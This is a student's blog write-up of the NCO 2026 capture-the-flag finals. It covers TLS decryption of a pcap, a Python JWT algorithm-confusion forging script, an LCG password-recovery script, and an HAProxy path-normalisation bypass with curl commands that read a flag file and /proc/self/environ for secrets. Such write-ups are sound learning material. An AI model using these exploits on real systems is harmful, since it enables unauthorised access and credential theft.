---
title: NCO 2026
published: 2026-03-28
description: Writeup for challenges I solved during NCO 2026
image: ./cover.jpeg
tags: [Cybersecurity, CTF, Writeup]
category: Cybersecurity
draft: false
---

_Cover: Team Raffles at NCO 2026_

# Overview

The National Cybersecurity Olympiad (NCO) is Singapore’s student cybersecurity pipeline, and I took part in its 2nd iteration this year. Participants have to go through qualifiers before taking part in the finals. Fortunately, I managed to land a spot to represent my school.

The finals were very chaotic and intense. During the 5 hour CTF, the competition infrastructure went down a few times, and I ended up waiting around a cumulative 1 hour even after the 30 minute extension they gave. I tried to preserve momentum throughout, but there were points in time where I could not even access the internet due to problems with routing (participants were connected to NCO infrastructure via LAN).

I managed to place 18th (out of 61 competitive plus 29 non-competitive players) and clinched a bronze medal. Though I am proud of this achievement, there are certainly improvements to be made. One more solve could have pushed me up to the silver cutoff, and I was extremely close to solving a web challenge. That being said, here are the writeups of challenges I managed to solve (and upsolve as of 5 hours after the competition).

# Writeups

## Skyscraper Records - Shell

For this challenge, I was provided a `capture.pcap` and `SSLKEYLOGFILE`. In Wireshark, we just see a bunch of encrypted traffic. To decrypt, I set Wireshark’s TLS “(Pre)-Master-Secret log filename” field to the path of the provided key log file. Then, I followed the TLS stream of a TLS packet, which shows the following:

```
[AUTH] input password >
robotsweepsweepsweep

[ENSIOH] >
show_cmds

[?] cmds:
show_cmds - show this message
show_secret - show secret
[?] unrecognized command!
[ENSIOH] >
```

I `nc` into the challenge instance and ran `show_secret`. Flag: `NCO26{dont_y0u_l0v3_th3_1nt3rn3t_0f_th1ngs}`

## TryHackICO - Token

This challenge was about exploiting JWT algorithm confusion in a node.js app.

Before exploiting anything, the backend in `app.js` does:

- Loads public key and private key from `private.pem` and `public.pem`
- Encodes and decodes JWTs with said keys
- Authenticates users on `/login`, then stores a JWT in the `auth` cookie
- Renders `/challenges`, where the flag is shown only if the `admin` field of a user's JWT evaluates to `true`
- Serves `public.pem` which is the public key generated at runtime.

Looking through the source code, I see that the `decodeToken` function accepts multiple algorithms, both asymmetric (RS256) and symmetric (HS256), while using the public key for verification.

```js
const decodeToken = (token) => {
  try {
    return jwt.verify(token, PUBLIC_KEY, {
      algorithms: ["HS256", "RS256", "ES256", "PS256"],
    });
  } catch (e) {
    return null;
  }
};

const encodeToken = (payload) => {
  return jwt.sign(payload, PRIVATE_KEY, {
    algorithm: "RS256",
    expiresIn: "30m",
  });
};
```

At the same time, we mentioned earlier that the app allows us to download `public.pem`. To solve the challenge, we need to:

1. Forge a JWT with header `alg: HS256`
2. Set payload with `admin: true`
3. Sign the JWT with `HMAC-SHA256` using the public key as the secret

I found a script online that does this for me [here](https://github.com/CircuitSoul/poc-cve-2016-10555/), which I then modified to solve this challenge.

```py
import hmac
import hashlib
import base64

file = open('public_chal.pem')

key = file.read()

header = '{"alg":"HS256"}'
payload = '{"user": "c","admin": "true", "iat": 1774669491}'

encodedHeaderBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader = str(encodedHeaderBytes, "utf-8").rstrip("=")

encodedPayloadBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPayload = str(encodedPayloadBytes, "utf-8").rstrip("=")

token = (encodedHeader + "." + encodedPayload)

sig = base64.urlsafe_b64encode(hmac.new(bytes(
    key, "UTF-8"), token.encode('utf-8'), hashlib.sha256).digest()).decode('UTF-8').rstrip("=")

print(token + '.' + sig)
```

I used BurpSuite to intercept the request and chucked the forged JWT in, and got the flag: `NCO26{h0peful1y_ICO_w0nt_be_h4ck3d}`

## Base26 - Notes

Given `server.py`:

```py
import os
import secrets


def lcg(a, b, p, x):
    while True:
        x = (a * x + b) % p
        yield x


p = 2**255-19
x, a, b = [secrets.randbelow(p) for _ in range(3)]
rng = lcg(a, b, p, x)

flag = os.environ.get('FLAG', 'NCO26{test_flag}')
notes = [{'password': x, 'content': flag}]


banner = '''
              _                    ____   __
  _____ _____| |__   __ _ ___  ___|___ \ / /_  _____ _____
 |_____|_____| '_ \ / _` / __|/ _ \ __) | '_ \|_____|_____|
 |_____|_____| |_) | (_| \__ \  __// __/| (_) |_____|_____|
             |_.__/ \__,_|___/\___|_____|\___/

Welcome to base26 note-taking platform!'''

print(banner)
while True:
    print('''Choose your option:
1. Take note
2. Read note
3. Exit''')
    choice = int(input())
    match choice:
        case 1:
            content = input('Enter the note content: ')
            password = next(rng)
            notes.append({'password': password, 'content': content})
            print('Your note is at index', len(notes)-1)
            print('Your note password is:', password)
        case 2:
            idx = int(input('Enter the note index you wish to read: '))
            password = int(input('Enter the note password: '))
            if notes[idx]['password'] == password:
                print(notes[idx]['content'])
            else:
                print('Wrong password')
        case _:
            break
    print()
```

The service stores the real flag in note index 0, protected by an initial random password $x_0$. Everytime we create a new note, the app prints a new password generated by:

$$
x_{n+1} = (a x_n + b) \bmod p,\quad p = 2^{255} - 19
$$

We can solve the challenge as such:

1. Create 3 notes and record three consecutive leaked passwords $x_1, x_2, x_3$.
2. Recover $a$ and $b$ modulo $p$.
3. Step backward to recover $x_0$.
4. Read note index 0 with password $x_0$ to get the flag.

Using modular inverse:

$$
a = (x_3 - x_2) \cdot (x_2 - x_1)^{-1} \bmod p
$$

$$
b = x_2 - a x_1 \bmod p
$$

$$
x_0 = a^{-1}(x_1 - b) \bmod p
$$

A quick solve script:

```py
p = 2**255 - 19
x1 = 30267209648638985813840507149356768454406709530153367390620633261401017379273
x2 = 53514743647770242385919762444841024048392046623152485868763613190619868527573
x3 = 31580233559763508480766299475777807217558236949881795704856151694982711527411

def inv(v):
    return pow(v % p, p-2, p)

a = ((x3 - x2) * inv(x2 - x1)) % p
b = (x2 - a * x1) % p
x0 = (inv(a) * (x1 - b)) % p

print(x0)
```

## Leaguerant - Admin (HTTP Request Smuggling)

This is part 2 of a challenge that uses the same source code. Solving part 2 also allows you to get the flag for part 1 (not sure if it was intended). Unfortunately, I did not solve this during the contest, but I came really close.

Leaguerant is a stickman dueling game where players shoot at an opponent. It uses a backend built in Flask, proxied via HAProxy. The backend handles user stats and game mechanics via API calls - That's not really important.

What stands out is the unfinished admin console at `/api/console` intended to provide a shell to run server commands.

```py
@app.route("/api/console", methods=["GET", "POST"])
def console():
    if request.method == 'POST':
        cmd = request.get_json().get('command', '')
        args = request.get_json().get("args", [])
        if cmd not in ['ls', 'cat']:
            return jsonify({"error": "Command under construction"}), 400
        res = subprocess.run([cmd] + args, capture_output=True, text=True)
        if res.stderr:
            return jsonify({"error": res.stderr.strip()}), 400
        return jsonify({"ok": True, "result": res.stdout.strip()})
    return render_template('console.html')
```

However, access to this path is blocked in `haxproxy.cfg`

```
defaults
    mode http
    option forwardfor
    timeout client 30s
    timeout connect 5s
    timeout http-keep-alive 10s
    timeout http-request 30s
    timeout server 60s

backend web
    http-response add-header Via haproxy
    http-response add-header X-Served-By %[env(HOSTNAME)]
    http-reuse always
    server web0 ${SERVER_HOSTNAME}:${SERVER_PORT}

frontend http
    bind *:8080
    default_backend web
    timeout client 5s
    timeout http-request 10s

    # Block traffic to unfinished cheat console
    acl restricted_page path_beg,url_dec -i /api/console
    http-request deny if restricted_page
```

The exploit lies in how the config uses `path_beg` which evaluates the prefix of the path after basic URL decoding. Flask and HAProxy normalise paths differently and so by simply appending an extra leading slash, we can bypass the Access Control List. (This is because Flask resolves, for example, `//api` to `/api`). We can get the console by requesting `//api/console`.

During the contest, I got to this point but couldn't run commands. Everytime I sent something with the console UI, it would return an error. I realised afterwards that this was due to how browsers interpret URIs beginning with `//` as protocol relative network URLs meaning it tries to contact a domain/host named `api` rather than maintaining the current host. This triggers a network-level fetch failure, which the code catches and outputs.

Another way to bypass the ACL could be using `/%2fapi/console`. However, even if I could access the console, this would not work too because of how the code was written. Let's take a look:

```js
// frontend
async function runAdminCmd(cmd) {
  if (!cmd.trim()) return;
  const output = document.getElementById("adminOutput");
  const addLine = (text, cls) => {
    const d = document.createElement("div");
    d.className = "term-line " + (cls || "");
    d.textContent = text;
    output.appendChild(d);
    output.scrollTop = output.scrollHeight;
  };
  addLine("$ " + cmd, "input");
  try {
    const res = await fetch("/api/admin/command", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: cmd }),
    });
    const data = await res.json();
    if (data.ok) {
      data.result.split("\n").forEach((line) => {
        addLine("→ " + line, "success");
      });
    } else addLine("✗ " + (data.error || "Error"), "err");
  } catch (e) {
    addLine("✗ Network error", "err");
  }
}
```

```py
# backend
@app.route("/api/console", methods=["GET", "POST"])
def console():
    if request.method == 'POST':
        cmd = request.get_json().get('command', '')
        args = request.get_json().get("args", [])
        if cmd not in ['ls', 'cat']:
            return jsonify({"error": "Command under construction"}), 400
        res = subprocess.run([cmd] + args, capture_output=True, text=True)
        if res.stderr:
            return jsonify({"error": res.stderr.strip()}), 400
        return jsonify({"ok": True, "result": res.stdout.strip()})
    return render_template('console.html')
```

When submitting a command, the frontend takes the `cmd` and sends it in the `command` field along with its args, instead of splitting it up into `command` and `args`. If I type say, `ls -lla`, the body of the request would look like `{"command": "ls -lla"}`. This causes the backend to block the request as it checks:

```py
if cmd not in ['ls', 'cat']:
    return jsonify({"error": "Command under construction"}), 400
```

So, we can simply just use a curl command as such:

```sh
curl -s -X POST 'http://http://chal.nco.sg:13001//api/console' -H 'Content-Type:application/json' --data '{"command":"cat","args":["LEAGUERANT_FLAG_2.txt"]}'
```

Note that we can just solve part 1 of the challenge with this exploit as well. Part 1's description mentioned that the flag was in an environment variable called `flag`. We could just modify the curl request and get that flag too:

```sh
curl -s -X POST 'http://http://chal.nco.sg:13001//api/console' -H 'Content-Type:application/json' --data '{"command":"cat","args":["/proc/self/environ"]}'
```

# Thoughts

All in all, NCO 2026 was a fun experience for me, besides the hiccups on the infrastructure side. For someone relatively new to cyber, I did pretty well. Being so close yet so far to solving [Leaguerant](#leaguerant---admin-http-request-smuggling) was a bummer though. I'm looking forward to upcoming CTFs, and hopefully I'll get some writeups done for them too.
